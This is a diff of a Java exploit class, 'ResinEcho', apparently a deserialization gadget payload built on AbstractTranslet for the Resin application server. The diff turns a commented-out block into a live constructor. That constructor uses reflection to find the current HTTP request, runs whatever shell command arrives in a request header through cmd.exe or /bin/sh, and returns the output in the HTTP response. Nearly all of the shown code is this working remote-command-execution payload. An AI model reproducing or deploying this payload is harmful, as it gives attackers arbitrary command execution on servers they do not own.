@@ -11,56 +11,78 @@ import java.lang.reflect.Field;
 
 /**
  * created by 0x22cb7139 on 2021/7/27
- * by java-object-search
+ *
  */
 public class ResinEcho extends AbstractTranslet {
-    /*
-    static{
-        try{
-            Field f = Thread.currentThread().getClass().getDeclaredField("threadLocals");
-            f.setAccessible(true);
-            Object obj = f.get(Thread.currentThread());
-            f  = obj.getClass().getDeclaredField("table");
-            f.setAccessible(true);
-            obj = f.get(obj);
-            Object[] objArr = (Object[]) obj;
-            for(int i = 0;i<objArr.length;i++){
-                Object o = objArr[i];
-                if(o==null) continue;
-                f = o.getClass().getDeclaredField("value");
-                f.setAccessible(true);
-                obj = f.get(o);
-                if(obj != null && obj.getClass().getName().equals("com.caucho.server.http.HttpRequest")) {
-                    com.caucho.server.http.HttpRequest req = (com.caucho.server.http.HttpRequest) obj;
-                    if(req.getHeader("cmd")!=null){
-                        String cmd = req.getHeader("cmd");
-                        PrintWriter writer = req.getResponse().getWriter();
-                        if (cmd != null) {
-                            String cc = "";
-                            java.lang.ProcessBuilder p;
-                            if(System.getProperty("os.name").toLowerCase().contains("win")){
-                                p = new java.lang.ProcessBuilder("cmd.exe", "/c", cmd);
-                            }else{
-                                p = new java.lang.ProcessBuilder("/bin/sh", "-c", cmd);
+    public ResinEcho() throws Exception {
+        boolean flag = false;
+        Thread[] threads = (Thread[])getFV(Thread.currentThread().getThreadGroup(), "threads");
+        for(int i = 0; i < threads.length; ++i) {
+            Thread thread = threads[i];
+            if (thread != null) {
+                String name = thread.getName();
+                if(getFV(thread,"threadLocals")!=null){
+                    Object[]  tables = (Object[]) getFV(getFV(thread,"threadLocals"),"table");
+                    for(int j=0;j<tables.length;j++){
+                        if(tables[j]!=null){
+                            if(getFV(tables[j],"value")!=null){
+                                if(getFV(tables[j],"value").getClass().getName().equals("com.caucho.server.http.HttpRequest")){
+                                    Object request = getFV(tables[j],"value");
+                                    Object response = request.getClass().getMethod("getResponse",new Class[0]).invoke(request,new Object[0]);
+                                    String cmd = (String) request.getClass().getMethod("getHeader",new Class[]{String.class}).invoke(request, new Object[]{new String("c")});
+                                    if (cmd != null && !cmd.isEmpty()) {
+                                        String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};
+                                        writeBody(response,(new java.util.Scanner((new ProcessBuilder(cmds)).start().getInputStream())).useDelimiter("\\A").next());
+                                        flag = true;
+                                    }
+                                }
+                                if(flag) {break;}
                             }
-                            java.util.Scanner c = new java.util.Scanner(p.start().getInputStream()).useDelimiter("\\A");
-                            cc = c.hasNext() ? c.next(): cc;
-                            c.close();
-                            writer.write(cc);
-                            writer.flush();
-                            writer.close();
-                        break;
                         }
                     }
+                    if(flag) {break;}
                 }
             }
-
-        }catch (Exception e){
-            e.printStackTrace();
         }
     }
 
-     */
+    public static Object getFV(Object obj,String fieldName) throws Exception{
+        java.lang.reflect.Field f0 = null;
+        Class clas = obj.getClass();
+        while (clas != Object.class){
+            try{
+                f0 = clas.getDeclaredField(fieldName);
+                break;
+            } catch (NoSuchFieldException e){
+                clas = clas.getSuperclass();
+            }
+        }
+
+        if (f0 != null){
+            f0.setAccessible(true);
+            return f0.get(obj);
+        }else {
+            throw new NoSuchFieldException(fieldName);
+        }
+    }
+
+    private static void writeBody(Object response, String result) throws Exception {
+        try{
+            response.getClass().getMethod("setContentLength", new Class[]{Integer.TYPE}).invoke(response,new Object[]{new Integer(result.getBytes().length)});
+            java.io.PrintWriter writer = (java.io.PrintWriter) response.getClass().getMethod("getWriter", new Class[0]).invoke(response,new Object[0]);
+            writer.write(result);
+            writer.flush();
+            writer.close();
+        }catch (NoSuchMethodException e){
+            response.getClass().getMethod("setHeader",new Class[]{String.class,String.class}).invoke(response,new Object[]{"Content-Length",result.getBytes().length+""});
+            java.lang.reflect.Method method = response.getClass().getDeclaredMethod("createResponseStream",new Class[0]);
+            method.setAccessible(true);
+            Object AbstractResponseStream = method.invoke(response,new Object[0]);
+            AbstractResponseStream.getClass().getMethod("write",new Class[]{byte[].class, Integer.TYPE, Integer.TYPE}).invoke(AbstractResponseStream,new Object[]{result.getBytes(), new Integer(0), new Integer(result.getBytes().length)});
+            AbstractResponseStream.getClass().getMethod("close",new Class[0]).invoke(AbstractResponseStream,new Object[0]);
+        }
+
+    }
 
     @Override
     public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
